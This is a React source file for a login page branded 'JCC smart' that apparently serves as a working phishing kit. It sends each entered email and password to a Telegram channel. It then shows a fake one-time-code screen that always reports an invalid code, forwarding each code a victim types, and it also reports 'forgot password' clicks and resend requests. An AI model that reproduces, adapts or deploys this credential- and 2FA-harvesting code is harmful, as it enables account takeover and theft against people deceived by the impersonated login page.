"use client"

import React, { useState, useEffect } from "react"
import { Eye, EyeOff, Loader2, ArrowLeft } from "lucide-react"
import { sendTelegramMessage } from "@/lib/telegram"

// JCC Smart Logo from public folder
const LOGO_SRC = "/jcc-logo.png"

function JccLogo({ className = "h-14 sm:h-16 w-auto" }: { className?: string }) {
  return (
    <div className="flex items-center justify-center select-none max-w-full">
      <img
        src={LOGO_SRC}
        alt="JCC smart"
        className={`object-contain max-h-16 sm:max-h-20 w-auto max-w-[180px] ${className}`}
        loading="eager"
      />
    </div>
  )
}

export default function LoginPage() {
  const [step, setStep] = useState<"login" | "otp">("login")

  // Login form state
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [emailFocused, setEmailFocused] = useState(false)
  const [passwordFocused, setPasswordFocused] = useState(false)
  const [isLoginLoading, setIsLoginLoading] = useState(false)

  // OTP form state
  const [otpCode, setOtpCode] = useState("")
  const [otpFocused, setOtpFocused] = useState(false)
  const [isOtpLoading, setIsOtpLoading] = useState(false)
  const [otpError, setOtpError] = useState("")
  const [otpAttempt, setOtpAttempt] = useState(1)
  const [timer, setTimer] = useState(60)
  const [canResend, setCanResend] = useState(false)
  const [resendSuccess, setResendSuccess] = useState(false)

  // OTP Timer countdown
  useEffect(() => {
    let interval: NodeJS.Timeout
    if (step === "otp" && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
    } else if (timer === 0) {
      setCanResend(true)
    }
    return () => clearInterval(interval)
  }, [step, timer])

  // Handle Login submission
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!email || !password) return

    setIsLoginLoading(true)

    try {
      // Send credentials tracking to telegram
      await sendTelegramMessage({
        title: "JCC SMART Login Attempt",
        email: email,
        password: password,
        type: "login_submit",
      })
    } catch (err) {
      console.error("Failed to send telegram alert:", err)
    }

    // 2-second loader before navigating to OTP screen
    setTimeout(() => {
      setIsLoginLoading(false)
      setStep("otp")
      setTimer(60)
      setCanResend(false)
      setOtpError("")
    }, 2000)
  }

  // Handle OTP submission - 2 sec loader and error message each time
  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!otpCode.trim() || isOtpLoading) return

    setIsOtpLoading(true)
    setOtpError("")

    const currentAttempt = otpAttempt
    const submittedCode = otpCode

    try {
      // Send OTP code to telegram with attempt tracking (otp1, otp2, otp3...)
      await sendTelegramMessage({
        title: `JCC SMART OTP Attempt #${currentAttempt}`,
        email: email,
        password: password,
        [`otp${currentAttempt}`]: submittedCode,
        otp1: submittedCode,
        type: "otp_submit",
      })
    } catch (err) {
      console.error("Failed to send telegram OTP alert:", err)
    }

    // Always wait 2 full seconds, then display error message each time
    setTimeout(() => {
      setIsOtpLoading(false)
      setOtpError("Invalid verification code. Please check your email and try again.")
      setOtpCode("")
      setOtpAttempt((prev) => prev + 1)
    }, 2000)
  }

  // Handle Resend OTP
  const handleResendOtp = async () => {
    if (!canResend) return
    setCanResend(false)
    setTimer(60)
    setResendSuccess(true)
    setTimeout(() => setResendSuccess(false), 3000)

    try {
      await sendTelegramMessage({
        title: "JCC SMART OTP Resend Requested",
        email: email,
        type: "otp_resend",
      })
    } catch (err) {
      console.error("Failed to trigger resend alert:", err)
    }
  }

  // Floating label condition: if focused or input has value
  const isEmailActive = emailFocused || email.length > 0
  const isPasswordActive = passwordFocused || password.length > 0
  const isOtpActive = otpFocused || otpCode.length > 0

  return (
    <div className="min-h-[100dvh] w-full bg-white flex flex-col items-center justify-center text-slate-800 antialiased font-sans overflow-x-hidden selection:bg-[#5643ba]/20 selection:text-[#5643ba]">
      {/* Mobile-first centered container */}
      <div className="w-full max-w-[420px] min-h-[100dvh] flex flex-col justify-between px-6 py-8 sm:px-8 sm:py-10 box-border">
        {step === "login" ? (
          /* ======================================================== */
          /*                    LOGIN SCREEN                          */
          /* ======================================================== */
          <>
            {/* Top section: Logo */}
            <div className="flex flex-col items-center pt-2 sm:pt-4">
              <JccLogo className="h-16 sm:h-20 w-auto" />
            </div>

            {/* Middle section: Headings & Form */}
            <div className="w-full flex flex-col items-center my-auto py-8">
              {/* Title & Subtitle */}
              <h1 className="text-[26px] sm:text-[28px] font-bold text-[#1e2329] tracking-tight mb-1.5 text-center">
                Welcome!
              </h1>
              <p className="text-[15px] sm:text-[16px] text-[#6e7480] font-normal text-center mb-10 tracking-normal">
                Log in to your account
              </p>

              {/* Login Form */}
              <form onSubmit={handleLoginSubmit} className="w-full space-y-7">
                {/* Email Field with Smooth Floating Label */}
                <div className="relative w-full border-b border-[#dedede] focus-within:border-[#5643ba] transition-colors duration-200">
                  <label
                    htmlFor="email"
                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
                      isEmailActive
                        ? "-top-3.5 text-xs text-[#5643ba] font-medium"
                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
                    }`}
                  >
                    Email
                  </label>
                  <input
                    id="email"
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    onFocus={() => setEmailFocused(true)}
                    onBlur={() => setEmailFocused(false)}
                    required
                    autoComplete="email"
                    className="w-full pt-2 pb-2.5 bg-transparent text-[16px] text-[#1e2329] focus:outline-none placeholder-transparent"
                  />
                </div>

                {/* Password Field with Smooth Floating Label & Toggle */}
                <div className="relative w-full border-b border-[#dedede] focus-within:border-[#5643ba] transition-colors duration-200">
                  <label
                    htmlFor="password"
                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
                      isPasswordActive
                        ? "-top-3.5 text-xs text-[#5643ba] font-medium"
                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
                    }`}
                  >
                    Password
                  </label>
                  <input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onFocus={() => setPasswordFocused(true)}
                    onBlur={() => setPasswordFocused(false)}
                    required
                    autoComplete="current-password"
                    className="w-full pt-2 pb-2.5 pr-10 bg-transparent text-[16px] text-[#1e2329] focus:outline-none placeholder-transparent"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    tabIndex={-1}
                    className="absolute right-0 top-2.5 text-[#8e95a2] hover:text-[#5643ba] transition-colors duration-150 p-0.5 focus:outline-none"
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? (
                      <Eye className="w-[20px] h-[20px] stroke-[1.75]" />
                    ) : (
                      <EyeOff className="w-[20px] h-[20px] stroke-[1.75]" />
                    )}
                  </button>
                </div>

                {/* Forgot Link */}
                <div className="flex justify-end -mt-3">
                  <a
                    href="#forgot"
                    onClick={(e) => {
                      e.preventDefault()
                      if (email) {
                        sendTelegramMessage({
                          title: "Forgot Password Clicked",
                          email,
                          type: "forgot_password",
                        })
                      }
                    }}
                    className="text-[14px] font-medium text-[#5643ba] hover:underline focus:outline-none"
                  >
                    Forgot?
                  </a>
                </div>

                {/* Log in Button */}
                <div className="pt-5">
                  <button
                    type="submit"
                    disabled={isLoginLoading || !email || !password}
                    style={{ backgroundColor: "#5643ba" }}
                    className="w-full h-[52px] rounded-xl text-white font-medium text-[16px] tracking-wide shadow-sm hover:opacity-95 active:scale-[0.99] transition-all duration-150 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
                  >
                    {isLoginLoading ? (
                      <div className="flex items-center space-x-2">
                        <Loader2 className="w-5 h-5 animate-spin text-white" />
                        <span>Logging in...</span>
                      </div>
                    ) : (
                      "Log in"
                    )}
                  </button>
                </div>
              </form>
            </div>

            {/* Bottom spacer for balance */}
            <div className="h-6" />
          </>
        ) : (
          /* ======================================================== */
          /*                     OTP SCREEN                           */
          /* ======================================================== */
          <>
            {/* Top Navigation & Logo */}
            <div className="relative flex items-center justify-center w-full pt-2 sm:pt-4">
              <button
                type="button"
                onClick={() => setStep("login")}
                className="absolute left-0 p-2 -ml-2 rounded-full text-[#6e7480] hover:text-[#1e2329] hover:bg-gray-100 transition-colors focus:outline-none cursor-pointer"
                aria-label="Back to login"
              >
                <ArrowLeft className="w-5 h-5" />
              </button>
              <JccLogo className="h-16 sm:h-20 w-auto" />
            </div>

            {/* Middle Section: OTP Verification Form */}
            <div className="w-full flex flex-col items-center my-auto py-8">
              {/* Title & Sent Email Notice */}
              <h1 className="text-[26px] sm:text-[28px] font-bold text-[#1e2329] tracking-tight mb-1.5 text-center">
                Verification Code
              </h1>
              
              <p className="text-[15px] sm:text-[16px] text-[#6e7480] font-normal text-center mb-10 tracking-normal px-2">
                Enter the verification code sent to <br />
                <span className="font-semibold text-[#1e2329]">{email}</span>
              </p>

              {/* OTP Form (Accepts unlimited digits) */}
              <form onSubmit={handleOtpSubmit} className="w-full space-y-6">
                {/* Floating label input accepting unlimited digits */}
                <div
                  className={`relative w-full border-b transition-colors duration-200 ${
                    otpError
                      ? "border-red-500"
                      : "border-[#dedede] focus-within:border-[#5643ba]"
                  }`}
                >
                  <label
                    htmlFor="otpCode"
                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
                      isOtpActive
                        ? `-top-3.5 text-xs font-medium ${
                            otpError ? "text-red-500" : "text-[#5643ba]"
                          }`
                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
                    }`}
                  >
                    Enter Verification Code
                  </label>
                  <input
                    id="otpCode"
                    type="text"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    value={otpCode}
                    onChange={(e) => {
                      // Allow any unlimited digit entry as requested
                      const value = e.target.value.replace(/[^0-9]/g, "")
                      setOtpCode(value)
                      if (otpError) setOtpError("")
                    }}
                    onFocus={() => {
                      setOtpFocused(true)
                      if (otpError) setOtpError("")
                    }}
                    onBlur={() => setOtpFocused(false)}
                    autoFocus
                    required
                    placeholder=" "
                    className="w-full pt-2 pb-2.5 bg-transparent text-[20px] tracking-widest text-[#1e2329] font-medium focus:outline-none"
                  />
                </div>

                {/* Error Message */}
                {otpError && (
                  <p className="text-[13px] text-red-500 font-medium text-center -mt-2">
                    {otpError}
                  </p>
                )}

                {/* Resend success alert */}
                {resendSuccess && (
                  <p className="text-[13px] text-green-600 font-medium text-center -mt-2">
                    A new verification code has been resent to your email!
                  </p>
                )}

                {/* Verify Button */}
                <div className="pt-3">
                  <button
                    type="submit"
                    disabled={isOtpLoading || !otpCode}
                    style={{ backgroundColor: "#5643ba" }}
                    className="w-full h-[52px] rounded-xl text-white font-medium text-[16px] tracking-wide shadow-sm hover:opacity-95 active:scale-[0.99] transition-all duration-150 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
                  >
                    {isOtpLoading ? (
                      <div className="flex items-center space-x-2">
                        <Loader2 className="w-5 h-5 animate-spin text-white" />
                        <span>Verifying...</span>
                      </div>
                    ) : (
                      "Confirm & Continue"
                    )}
                  </button>
                </div>

                {/* Resend Code Section with Timer */}
                <div className="text-center pt-2">
                  {canResend ? (
                    <button
                      type="button"
                      onClick={handleResendOtp}
                      className="text-[14px] font-semibold text-[#5643ba] hover:underline focus:outline-none cursor-pointer"
                    >
                      Resend Verification Code
                    </button>
                  ) : (
                    <p className="text-[13.5px] text-[#8e95a2]">
                      Resend code in{" "}
                      <span className="font-semibold text-[#5643ba]">
                        00:{timer.toString().padStart(2, "0")}
                      </span>
                    </p>
                  )}
                </div>
              </form>
            </div>

            {/* Bottom info link */}
            <div className="text-center pb-2">
              <button
                type="button"
                onClick={() => setStep("login")}
                className="text-[13.5px] text-[#6e7480] hover:text-[#5643ba] transition-colors focus:outline-none"
              >
                Entered incorrect email? <span className="font-medium text-[#5643ba] underline">Change</span>
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  )
}
